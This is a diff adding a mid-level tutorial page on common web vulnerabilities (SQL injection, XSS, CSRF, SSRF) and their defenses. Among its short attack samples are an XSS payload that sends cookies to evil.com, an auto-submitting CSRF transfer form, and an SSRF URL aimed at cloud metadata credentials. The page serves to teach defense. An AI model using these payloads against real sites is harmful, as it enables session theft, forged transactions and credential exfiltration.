@@ -1,0 +1,120 @@
+---
+title: "Common Web Vulnerabilities: Injection, XSS, CSRF, SSRF"
+description: How the classic attacks work, and the systematic defenses that make them structurally impossible.
+minutes: 13
+level: mid
+---
+
+<Problem>
+The same handful of vulnerability classes has topped breach reports for 20+ years. They're not exotic; they come from mixing **untrusted data with code or commands** and from servers **trusting requests they shouldn't**. Each has a well-known, systematic defense. Knowing them is table stakes for any backend engineer.
+</Problem>
+
+## 1. Injection (SQL, command, LDAP, template…)
+
+Untrusted input is concatenated into something that gets **interpreted**.
+
+```java
+// ❌ SQL injection: name = "x' OR '1'='1"  → returns every user
+String sql = "SELECT * FROM users WHERE name = '" + name + "'";
+
+// ✅ Parameterized query: input is always data, never code
+jdbc.query("SELECT * FROM users WHERE name = ?", mapper, name);
+// JPA: @Query("select u from User u where u.name = :name") with @Param, or derived queries
+```
+
+Defenses: **parameterized queries / prepared statements everywhere** (including ORMs' native queries), allowlists for things that can't be parameterized (sort column names), never building shell commands from input (`ProcessBuilder` with argument arrays, not a shell string), least-privilege DB users.
+
+## 2. Cross-Site Scripting (XSS)
+
+Attacker-controlled data is rendered as **HTML/JS in other users' browsers**, running in your site's origin: stealing tokens, acting as the user.
+
+```html
+<!-- comment text = <img src=x onerror="fetch('https://evil.com?c='+document.cookie)"> -->
+<div>${comment}</div>   ❌ if inserted as raw HTML
+```
+
+Defenses: **context-aware output encoding** (React/Angular/Thymeleaf escape by default; avoid `dangerouslySetInnerHTML`/`th:utext` with untrusted data), sanitize rich HTML with an allowlist (OWASP Java HTML Sanitizer, DOMPurify), **Content-Security-Policy** headers to block inline scripts, **HttpOnly** cookies so scripts can't read session tokens.
+
+## 3. Cross-Site Request Forgery (CSRF)
+
+A malicious site makes the victim's browser send a request to your site, **with the victim's cookies attached automatically**.
+
+```html
+<!-- on evil.com -->
+<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="5000"></form>
+<script>document.forms[0].submit()</script>
+```
+
+Defenses: **`SameSite=Lax` or `Strict` cookies** (modern default protection), **CSRF tokens** for cookie-authenticated state-changing requests (Spring Security does this by default for sessions), never change state with `GET`, check `Origin` headers. APIs using `Authorization: Bearer` headers (not cookies) aren't CSRF-able in the same way.
+
+## 4. Server-Side Request Forgery (SSRF)
+
+Your server fetches a URL supplied by the user ("import from URL", webhooks, image previews), and the attacker points it at **internal** resources:
+
+```text
+https://your-app.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  → your server fetches cloud instance credentials and returns them
+```
+
+The Capital One breach (2019) used SSRF against cloud metadata. Defenses: **allowlist** destinations where possible; resolve DNS and **block private/link-local/loopback ranges** (and re-check after redirects; beware DNS rebinding); use **IMDSv2** (token-required metadata service); route outbound fetches through an egress proxy; don't return raw fetched content.
+
+## 5. Other classics, briefly
+
+- **Path traversal**: `../../etc/passwd` in file names. Never build paths from input; use generated IDs.
+- **Insecure deserialization**: deserializing untrusted Java objects can execute code. Avoid native Java serialization of untrusted data; use JSON with explicit types.
+- **XXE**: XML parsers resolving external entities. Disable DTDs/external entities.
+- **Open redirects**: `?next=https://evil.com`. Allowlist redirect targets.
+- **Security misconfiguration**: default credentials, verbose errors, open admin consoles, debug endpoints (Actuator) exposed publicly.
+
+<MentalModel>
+Most of these attacks are the same trick: **getting the system to treat data as instructions**. Injection makes the database treat text as SQL. XSS makes the browser treat a comment as code. SSRF makes your server treat a user's URL as its own errand. CSRF makes the browser treat a stranger's form as the user's intent. Each defense restores the boundary between data and instructions, or between "the user meant this" and "someone tricked them".
+</MentalModel>
+
+<Quiz
+  question="Your app lets admins sort tables by a column name passed as ?sort=created_at, which can't be a bind parameter. How do you safely build the query?"
+  options={[
+    "Escape quotes in the sort parameter",
+    "Map the input against an allowlist of permitted column names and use the mapped value; reject anything else",
+    "Use a regex to remove semicolons",
+    "Trust it because only admins use it",
+  ]}
+  answer={1}
+  explanation="Identifiers can't be parameterized, so allowlist them. Escaping and blacklists are fragile, and admin accounts get compromised too."
+/>
+
+<Tradeoffs
+  good={[
+    "Parameterization, auto-escaping and SameSite cookies prevent whole classes of bugs structurally",
+    "Frameworks provide most defenses by default",
+    "CSP and egress controls add depth when code-level defenses slip",
+  ]}
+  bad={[
+    "Escape hatches (raw SQL, raw HTML) reintroduce risk silently",
+    "CSP can be tricky to roll out on legacy frontends",
+    "SSRF defenses are subtle (redirects, DNS rebinding, IPv6)",
+  ]}
+/>
+
+<LevelTags
+  junior="Always uses parameterized queries and framework escaping; never GET for state changes."
+  mid="Handles CSRF, SSRF-prone features, file uploads and sanitization correctly."
+  senior="Designs systemic defenses (CSP, egress proxies, IMDSv2, safe defaults) and reviews code for these classes."
+  lead="Embeds SAST/DAST, security reviews and training into the delivery process."
+/>
+
+<SeniorLens>
+Seniors eliminate vulnerability **classes**, not instances: a lint rule that bans string-concatenated SQL, a shared HTTP client that blocks private IP ranges, a template engine with auto-escaping. Fixing one XSS is a bug fix; making XSS impossible by default is leverage.
+</SeniorLens>
+
+<KeyTakeaways>
+- Injection → parameterize everything; allowlist identifiers.
+- XSS → context-aware escaping, sanitization, CSP, HttpOnly cookies.
+- CSRF → SameSite cookies, CSRF tokens, no state-changing GETs.
+- SSRF → allowlists, block internal ranges, IMDSv2, egress proxies.
+</KeyTakeaways>
+
+<GoDeeper>
+- **[OWASP Top 10](https://owasp.org/Top10/)** and the **OWASP Cheat Sheet Series** (SQLi, XSS, CSRF, SSRF).
+- **[PortSwigger Web Security Academy](https://portswigger.net/web-security)**: free, hands-on labs for every vulnerability here.
+- **Spring Security reference:** CSRF and headers.
+</GoDeeper>
